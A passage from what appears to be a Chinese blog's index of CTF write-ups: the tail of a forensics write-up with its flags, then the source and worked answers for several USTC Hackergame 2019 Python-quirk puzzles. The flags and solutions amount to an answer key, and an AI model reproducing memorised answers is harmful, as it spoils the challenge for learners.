Files\\D9f\\gCFhd\\yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm\\O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE\\0t33K+0.bat</code>。我们同时搜到了路径和后面的文件，先用带文件名的路径试试。然后我们注意到，Base64没有<code>\\</code>，但是有<code>/</code>，那么大胆猜测一下上述路径是个Base64：<code>D9f/gCFhd/yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm/O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE/0t33K+0</code>，丢到上面的程序，看一下出什么结果。报错了，Base64不全，我们加个=，然后就得到了第三个Flag：ALLES{0n3_f0r3n51k_tr345ur3_15_ly1ng_w1th1n_th3_5h1mc4ch3}。</p>\r\n\n    <div id=\"aplayer-BELYfEvc\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4233965\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5fd6d1a0-ac6c-4140-a6ae-64cdda65a015}</p>\r\n","categories":["Writeups"],"tags":["Misc","C#","AES","Forensic","Windows","Volatility","SID"]},{"title":"USTC-Hackergame-2019-不同寻常的Python考试","url":"/2019/11/17/USTC-Hackergame-2019-%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84Python%E8%80%83%E8%AF%95/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>USTC Hackergame 2019的一道题。 看源码吧： <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> traceback</span><br><span class=\"line\"><span class=\"keyword\">from</span> copy <span class=\"keyword\">import</span> deepcopy</span><br><span class=\"line\"></span><br><span class=\"line\">RED = <span class=\"string\">&quot;\\033[31m&quot;</span></span><br><span class=\"line\">GREEN = <span class=\"string\">&quot;\\033[32m&quot;</span></span><br><span class=\"line\">YELLOW = <span class=\"string\">&quot;\\033[33m&quot;</span></span><br><span class=\"line\">END = <span class=\"string\">&quot;\\033[0m&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">timeout</span>(<span class=\"params\">*args, **kwargs</span>):</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;Timeout!&quot;</span>)</span><br><span class=\"line\">    exit(<span class=\"number\">-1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Challenges</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        signal.signal(signal.SIGALRM, timeout)</span><br><span class=\"line\">        self.challenges = &#123;&#125;</span><br><span class=\"line\">        self.cleared = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> method <span class=\"keyword\">in</span> dir(self):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> method.startswith(<span class=\"string\">&quot;challenge_&quot;</span>):</span><br><span class=\"line\">                n = int(method.split(<span class=\"string\">&quot;_&quot;</span>)[<span class=\"number\">-1</span>])</span><br><span class=\"line\">                self.challenges[n] = getattr(self, method)</span><br><span class=\"line\">                self.cleared[n] = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">do_challenge</span>(<span class=\"params\">self, n</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            inp = input(<span class=\"string\">&quot;Your answer: &quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> len(inp) &gt; <span class=\"number\">100</span>:</span><br><span class=\"line\">                print(<span class=\"string\">&quot;Input too long&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                answer = ast.literal_eval(inp)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">                print(<span class=\"string\">&quot;Invalid input!&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">    </span><br><span class=\"line\">        signal.alarm(<span class=\"number\">1</span>)</span><br><span class=\"line\">        print(YELLOW, end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> self.challenges[n](answer):</span><br><span class=\"line\">                print(<span class=\"string\">f&quot;Challenge <span class=\"subst\">&#123;n:<span class=\"number\">02</span>d&#125;</span> cleared!&quot;</span>)</span><br><span class=\"line\">                self.cleared[n] = <span class=\"literal\">True</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">f&quot;Challenge <span class=\"subst\">&#123;n:<span class=\"number\">02</span>d&#125;</span> failed!&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            print(traceback.format_exc(), end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        print(END, end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        signal.alarm(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_status</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        print()</span><br><span class=\"line\">        print(<span class=\"string\">&quot;------ Do you know Python? ------&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i, (challenge, cleared) <span class=\"keyword\">in</span> enumerate(sorted(self.cleared.items())):</span><br><span class=\"line\">            color = GREEN <span class=\"keyword\">if</span> cleared <span class=\"keyword\">else</span> RED</span><br><span class=\"line\">            text = <span class=\"string\">&quot;Y&quot;</span> <span class=\"keyword\">if</span> cleared <span class=\"keyword\">else</span> <span class=\"string\">&quot;N&quot;</span></span><br><span class=\"line\">            print(color + <span class=\"string\">f&quot;<span class=\"subst\">&#123;challenge:<span class=\"number\">02</span>d&#125;</span>: <span class=\"subst\">&#123;text&#125;</span>&quot;</span> + END, end=<span class=\"string\">&quot;  &quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i % <span class=\"number\">5</span> == <span class=\"number\">4</span>:</span><br><span class=\"line\">                print()</span><br><span class=\"line\">        print()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cleared_count</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> sum(self.cleared.values())</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">total_count</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> len(self.challenges)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_1</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> answer == <span class=\"string\">&quot;Hello&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_2</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b, c, d = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a == b <span class=\"keyword\">and</span> a <span class=\"keyword\">is</span> b <span class=\"keyword\">and</span> c == d <span class=\"keyword\">and</span> c <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> d:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_3</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> answer <span class=\"keyword\">in</span> answer == answer:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_4</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a1, b1 = answer</span><br><span class=\"line\">        a2, b2 = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a1 * <span class=\"number\">2</span> != a1 <span class=\"keyword\">and</span> b1 * <span class=\"number\">2</span> != b1:</span><br><span class=\"line\">            a1 *= <span class=\"number\">2</span></span><br><span class=\"line\">            b1 *= <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> a1 == a2 <span class=\"keyword\">and</span> b1 != b2:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_5</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        r = reversed([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> list(r) == list(r) + answer:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_6</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> max(a, b) != max(b, a):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_7</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b, c = answer</span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b, c:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> a * (b + c) != a * b + a * c:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_8</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b, c = answer</span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b, c:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> a * (b * c) != (a * b) * c:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_9</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> type(a ** b) != type(b ** a):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_10</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a <span class=\"keyword\">and</span> a.count(b) &gt; len(a):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_11</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> max(answer) != max(*answer):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_12</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a &lt; b <span class=\"keyword\">and</span> all(x &gt; y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a, b)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_13</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> b <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> (a ^ b) - a:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_14</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        backup = deepcopy(answer)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            answer[<span class=\"number\">0</span>] += answer[<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> backup != answer:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_15</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        item, l = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> item <span class=\"keyword\">in</span> l <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> min(l) &lt;= item &lt;= max(l):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_16</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        item, l = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> item == <span class=\"number\">233</span> <span class=\"keyword\">and</span> item <span class=\"keyword\">in</span> l <span class=\"keyword\">and</span> l <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_17</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        item, l = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> l[<span class=\"number\">0</span>] == item <span class=\"keyword\">and</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_18</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        a, b = answer</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a - b) != -(b - a):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_19</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> answer.isdecimal():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> len(answer) &lt; <span class=\"number\">5</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sum(ord(c) - ord(<span class=\"string\">&quot;0&quot;</span>) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> answer) == <span class=\"number\">23333</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_20</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(set(str(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> answer)) == <span class=\"number\">7</span> <span class=\"keyword\">and</span> all(x == <span class=\"number\">0</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> answer):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    c = Challenges()</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        c.show_status()</span><br><span class=\"line\">        inp = input(<span class=\"string\">&quot;Which one do you want to play? &quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            n = int(inp)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Invalid input!&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> n <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> c.challenges:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Challenge not found!&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        c.do_challenge(n)</span><br><span class=\"line\">        print(<span class=\"string\">f&quot;Your progress: <span class=\"subst\">&#123;c.cleared_count()&#125;</span>/<span class=\"subst\">&#123;c.total_count()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> c.cleared_count() == c.total_count():</span><br><span class=\"line\">            print(<span class=\"string\">&quot;You are the master of Python.&quot;</span>)</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Here is the final flag:&quot;</span>)</span><br><span class=\"line\">            print(open(<span class=\"string\">&quot;flag3&quot;</span>).read().strip())</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> c.cleared_count() &gt;= c.total_count() * <span class=\"number\">3</span> // <span class=\"number\">4</span>:</span><br><span class=\"line\">            print(open(<span class=\"string\">&quot;flag2&quot;</span>).read().strip())</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> c.cleared_count() &gt;= c.total_count() // <span class=\"number\">2</span>:</span><br><span class=\"line\">            print(open(<span class=\"string\">&quot;flag1&quot;</span>).read().strip())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Go on to get your flags!&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure> 明显Python3版本，这段代码核心就是用ast.literal_eval计算我们的输入，与每一Challenge的要求相比较，相等就通过。输入不能超过100个字符。那就一个一个看吧：</p>\r\n<h1 id=\"字符串比较\">01 字符串比较</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_1</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> answer == <span class=\"string\">&quot;Hello&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>这个很简单，我们输入<code>'Hello'</code>，输入会被处理成字符串，字符串比较。</p>\r\n<h1 id=\"与is\">02 ==与is</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_2</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b, c, d = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == b <span class=\"keyword\">and</span> a <span class=\"keyword\">is</span> b <span class=\"keyword\">and</span> c == d <span class=\"keyword\">and</span> c <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> d:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>我们要输入一个list或tuple，分别赋值a b c d，要求a==b，a与b为同一对象，c==d，c与d不为同一对象。这里就多解了，Python3中char型整数是缓存的（参考<a href=\"https://wsvincent.com/python-wat-integer-cache/\">这里</a>），因此1 is 1。然后Python比较数字的时候没有要求两数字为同一类型（参考<a href=\"https://stackoverflow.com/questions/21358559/why-in-python-1-0-1-true-2-0-2-true-and-etc\">这里</a>），因此1==1.0，但是float类型是不会缓存的，因此1 is not 1.0。第二个判断还可以用任何可变类型，如[1]==[1]，[1] is not [1]。示例答案：[1,1,2,2.0]</p>\r\n<h1 id=\"in的运算符优先级\">03 in的运算符优先级</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_3</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> answer <span class=\"keyword\">in</span> answer == answer:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>Python3中in和==同时使用会怎样？找一下<a href=\"https://www.runoob.com/python3/python3-basic-operators.html\">运算符优先级</a>，发现in是后于==计算的，因此那个if可以改写成：<code>if (answer==answer) and (answer in answer):</code>，任意字符串都可以满足上述条件。</p>\r\n<h1 id=\"unpack与对象内存地址\">04 Unpack与对象内存地址</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_4</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a1, b1 = answer</span><br><span class=\"line\">    a2, b2 = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a1 * <span class=\"number\">2</span> != a1 <span class=\"keyword\">and</span> b1 * <span class=\"number\">2</span> != b1:</span><br><span class=\"line\">        a1 *= <span class=\"number\">2</span></span><br><span class=\"line\">        b1 *= <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> a1 == a2 <span class=\"keyword\">and</span> b1 != b2:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>首先明确一点，iterable对象answer在unpack的时候a1,a2 b1,b2具有相同的内存地址。那么这题就简单了：要求a1在*2后地址保持不变，而a2*2后地址要改变。随便找个list和int就行：<code>[[2],2]</code>。</p>\r\n<h1 id=\"reversed与iterator\">05 reversed与iterator</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_5</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    r = reversed([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> list(r) == list(r) + answer:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>reversed()函数文档在<a href=\"https://docs.python.org/3/library/functions.html#reversed\">这里</a>，它返回一个iterator，包含逆序排列过的元素，但是Python3的<a href=\"https://docs.python.org/3/glossary.html#term-iterator\">iterator</a>在访问完全部元素后会变空，因此if判断的第二个list(r)是空的，我们给个[3,2,1]就可以满足条件。</p>\r\n<h1 id=\"max与集合\">06 max与集合</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_6</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> max(a, b) != max(b, a):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>max()返回参数中最大值，但是对于set而言，不像list等对象，max()应用于集合上会返回更全的集合，如a是b的真子集，返回b，如果a b没有交集则返回元素最多的集合，如a b元素个数相同且没有交集，则返回第一个集合。因此任意给两个集合就可以了：<code>[&#123;1&#125;,&#123;2&#125;]</code>。</p>\r\n<h1 id=\"section\">07 + *</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_7</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b, c = answer</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b, c:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a * (b + c) != a * b + a * c:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>不允许使用float和complex，要求不满足乘法分配律。Python中+和*可以对iterable对象使用，如果b c为不同字符串，就可以满足条件了：<code>[2,'a','b']</code>。</p>\r\n<h1 id=\"ver-2\">08 + * Ver 2</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_8</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b, c = answer</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b, c:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a * (b * c) != (a * b) * c:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>跟上一题差不多，要求不能满足乘法结合律。Python中*还可以出现负数，0或负数时结果会变空：<code>[\"a\",-1,-2]</code>。</p>\r\n<h1 id=\"section-1\">09 **</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_9</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a, b:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(x, float) <span class=\"keyword\">or</span> isinstance(x, complex):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> type(a ** b) != type(b ** a):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求a**b和b**a结果的类型不一致。用的是**，计算N次幂，很容易想到pow(-1,2)==1，pow(2,-1)==0.5。两个数据类型不一致。</p>\r\n<h1 id=\"count\">10 count</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_10</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a <span class=\"keyword\">and</span> a.count(b) &gt; len(a):</span><br><span class=\"line\">        <span 